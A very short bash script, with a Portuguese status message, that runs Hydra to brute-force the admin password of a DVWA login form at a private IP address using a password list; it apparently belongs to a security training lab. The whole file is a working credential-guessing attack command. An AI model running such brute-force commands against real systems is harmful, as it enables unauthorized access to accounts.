#!/bin/bash\necho 'Executando Hydra...'
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/dvwa/login.php:user=^USER^&pass=^PASS^:Login failed"